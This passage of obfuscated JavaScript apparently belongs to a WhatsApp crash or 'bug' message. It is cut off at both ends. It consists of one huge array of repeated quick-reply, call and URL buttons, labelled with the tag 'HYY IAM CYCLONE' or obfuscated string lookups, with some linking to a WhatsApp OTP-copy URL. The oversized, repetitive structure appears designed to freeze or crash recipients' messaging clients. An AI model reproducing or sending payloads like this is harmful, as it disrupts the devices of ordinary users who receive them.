ckReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyBu